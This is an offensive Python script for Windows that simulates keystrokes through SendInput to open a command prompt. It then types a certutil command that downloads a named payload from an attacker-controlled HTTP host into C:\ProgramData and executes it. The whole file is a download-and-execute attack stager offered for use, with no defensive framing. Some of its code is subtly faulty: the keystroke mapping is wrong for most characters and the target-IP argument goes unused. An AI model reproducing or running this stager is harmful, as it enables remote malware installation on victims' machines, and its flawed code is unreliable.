#!/usr/bin/python3

import ctypes
import time
import sys

# Define necessary Windows API functions and constants
SendInput = ctypes.windll.user32.SendInput

# Key codes
VK_RETURN = 0x0D
VK_LWIN = 0x5B

# C struct redefinitions
class INPUT(ctypes.Structure):
    _fields_ = [("type", ctypes.c_uint),
                ("ki", ctypes.c_ulong * 6)]

# Function to create a key event
def create_key_event(vk_code: int, is_press: bool) -> INPUT:
    flags = 0 if is_press else 2  # 0 for key press, 2 for key release
    return INPUT(1, (vk_code, 0, flags, 0, 0, 0))

# Function to send a key press
def press_key(vk_code: int):
    key_down = create_key_event(vk_code, True)
    key_up = create_key_event(vk_code, False)
    SendInput(1, ctypes.pointer(key_down), ctypes.sizeof(INPUT))
    SendInput(1, ctypes.pointer(key_up), ctypes.sizeof(INPUT))
    time.sleep(0.4)

# Function to type a string one character at a time
def type_string(text: str):
    for char in text:
        vk_code = ord(char)  # Convert character to virtual key code
        press_key(vk_code)
        time.sleep(0.1)

# Command-line argument validation
if len(sys.argv) != 4:
    print(f"Usage: python {sys.argv[0]} <target-ip> <local-http-ip> <payload-name>")
    sys.exit(1)

_, rhost, lhost, payload = sys.argv

def main():
    print("[+] Simulating keypresses")
    
    # Open Start Menu
    press_key(VK_LWIN)
    print("[+] Opening Start Menu")
    time.sleep(1)
    
    # Open Command Prompt
    type_string("cmd.exe")
    press_key(VK_RETURN)
    print("[+] Opened CMD")
    time.sleep(1)
    
    # Download and execute the payload
    command = f"certutil.exe -f -urlcache http://{lhost}/{payload} C:\\ProgramData\\{payload}"
    type_string(command)
    press_key(VK_RETURN)
    print("[+] Downloaded payload")
    time.sleep(2)
    
    execute_command = f"C:\\ProgramData\\{payload}"
    type_string(execute_command)
    press_key(VK_RETURN)
    print("[+] Executed payload")

if __name__ == "__main__":
    main()
